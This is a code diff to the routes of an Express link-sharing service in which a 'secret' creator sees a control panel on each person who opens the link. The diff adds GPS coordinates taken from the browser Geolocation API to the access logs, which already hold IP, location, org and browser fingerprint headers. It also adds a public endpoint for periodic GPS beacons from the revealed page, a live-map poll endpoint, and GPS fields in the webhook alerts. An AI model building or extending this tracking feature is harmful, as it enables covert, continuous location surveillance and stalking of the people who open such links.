@@ -28,7 +28,7 @@ const getSecretForControl = db.prepare(`
 const getLogs = db.prepare(`
   SELECT accessed_at, ip_address, location, org, timezone,
          user_agent, accept_language, sec_ch_ua, sec_fetch_site,
-         referer, request_path, reveal_attempted, reveal_succeeded
+         referer, request_path, reveal_attempted, reveal_succeeded, gps_lat, gps_lng
   FROM access_logs WHERE secret_id = ?
   ORDER BY accessed_at DESC LIMIT 500
 `);
@@ -39,6 +39,17 @@ const updateWebhook = db.prepare(`
 
 const updateNote = db.prepare(`
   UPDATE secrets SET note = @note WHERE public_token = @token
+`);
+
+const insertBeacon = db.prepare(`
+  INSERT INTO location_beacons (secret_id, gps_lat, gps_lng, accuracy, ip_address)
+  VALUES (@secretId, @gpsLat, @gpsLng, @accuracy, @ip)
+`);
+
+const getBeacons = db.prepare(`
+  SELECT beaconed_at, gps_lat, gps_lng, accuracy, ip_address
+  FROM location_beacons WHERE secret_id = ?
+  ORDER BY beaconed_at DESC LIMIT 500
 `);
 
 const burnSecret = db.prepare(`
@@ -92,6 +103,7 @@ router.get('/:token/control', (req, res) => {
     if (!secret) return res.status(404).render('error.njk', { message: 'Control panel not found.' });
 
     const logs          = getLogs.all(secret.id);
+    const beacons       = getBeacons.all(secret.id);
     const baseUrl       = process.env.BASE_URL || '';
     const expired       = secret.expires_at && secret.expires_at < Math.floor(Date.now() / 1000);
     const retentionDays = parseInt(process.env.RETENTION_DAYS || '30', 10);
@@ -119,7 +131,7 @@ router.get('/:token/control', (req, res) => {
     const narrativeSummary = buildNarrativeSummary(logs, secret, stats);
 
     return res.render('control.njk', {
-      secret, logs, stats, uniqueIPLogs,
+      secret, logs, beacons, stats, uniqueIPLogs,
       publicUrl:    `${baseUrl}/s/${secret.public_token}`,
       controlUrl:   `${baseUrl}/s/${secret.public_token}/control`,
       burned:       !!secret.burned,
@@ -154,7 +166,7 @@ router.get('/:token/poll', (req, res) => {
     const newLogs = db.prepare(`
       SELECT accessed_at, ip_address, location, org, timezone,
              user_agent, accept_language, sec_ch_ua, sec_fetch_site,
-             referer, request_path, reveal_attempted, reveal_succeeded
+             referer, request_path, reveal_attempted, reveal_succeeded, gps_lat, gps_lng
       FROM access_logs WHERE secret_id = ? AND accessed_at > ?
       ORDER BY accessed_at DESC LIMIT 100
     `).all(secret.id, since);
@@ -179,6 +191,27 @@ router.get('/:token/poll', (req, res) => {
   } catch (err) {
     console.error('[Poll] Error:', err);
     return res.status(500).json({ error: 'Poll failed.' });
+  }
+});
+
+// ── GET /s/:token/beacon/poll ────────────────────────────────────────────────
+// Returns new beacon entries since a given timestamp for live map updates.
+router.get('/:token/beacon/poll', (req, res) => {
+  try {
+    const secret = getSecretForControl.get(req.params.token);
+    if (!secret) return res.status(404).json({ error: 'Not found.' });
+
+    const since = parseInt(req.query.since || '0', 10);
+    const newBeacons = db.prepare(`
+      SELECT beaconed_at, gps_lat, gps_lng, accuracy, ip_address
+      FROM location_beacons WHERE secret_id = ? AND beaconed_at > ?
+      ORDER BY beaconed_at ASC LIMIT 100
+    `).all(secret.id, since);
+
+    return res.json({ newBeacons });
+  } catch (err) {
+    console.error('[Beacon Poll] Error:', err);
+    return res.status(500).json({ error: 'Beacon poll failed.' });
   }
 });
 
@@ -240,6 +273,34 @@ router.post('/:token/webhook/test', async (req, res) => {
   }
 });
 
+// ── POST /s/:token/beacon ────────────────────────────────────────────────────
+// Accepts periodic GPS pings from the revealed page — no page reload needed.
+router.post('/:token/beacon', publicLimiter, (req, res) => {
+  try {
+    const secret = getSecret.get(req.params.token);
+    if (!secret) return res.status(404).json({ error: 'Not found.' });
+
+    const { lat, lng, accuracy } = req.body || {};
+    if (typeof lat !== 'number' || typeof lng !== 'number')
+      return res.status(400).json({ error: 'lat and lng required.' });
+
+    const ip = require('../middleware/logger').extractIP(req);
+
+    insertBeacon.run({
+      secretId: secret.id,
+      gpsLat:   lat,
+      gpsLng:   lng,
+      accuracy: typeof accuracy === 'number' ? accuracy : null,
+      ip,
+    });
+
+    return res.json({ ok: true });
+  } catch (err) {
+    console.error('[Beacon] Error:', err);
+    return res.status(500).json({ error: 'Beacon failed.' });
+  }
+});
+
 // ── GET /s/:token ─────────────────────────────────────────────────────────
 router.get('/:token', publicLimiter, (req, res) => {
   const secret = getSecret.get(req.params.token);
@@ -296,7 +357,13 @@ router.post('/:token/reveal', publicLimiter, (req, res) => {
     }
   }
 
-  const { ip, geo } = logAccess(req, secret.id, true, succeeded);
+  // Extract GPS coords if provided by browser Geolocation API
+  const rawLat = req.body?.gps_lat;
+  const rawLng = req.body?.gps_lng;
+  const gpsCoords = (typeof rawLat === 'number' && typeof rawLng === 'number')
+    ? { lat: rawLat, lng: rawLng } : null;
+
+  const { ip, geo } = logAccess(req, secret.id, true, succeeded, gpsCoords);
   const baseUrl   = process.env.BASE_URL || '';
 
   if (secret.webhook_url) {
@@ -305,6 +372,8 @@ router.post('/:token/reveal', publicLimiter, (req, res) => {
       publicUrl: `${baseUrl}/s/${secret.public_token}`,
       ip,
       location:  geo ? geo.display : null,
+      gpsLat:    gpsCoords ? gpsCoords.lat : null,
+      gpsLng:    gpsCoords ? gpsCoords.lng : null,
       userAgent: req.headers['user-agent'] || null,
       referer:   req.headers['referer']    || null,
     });
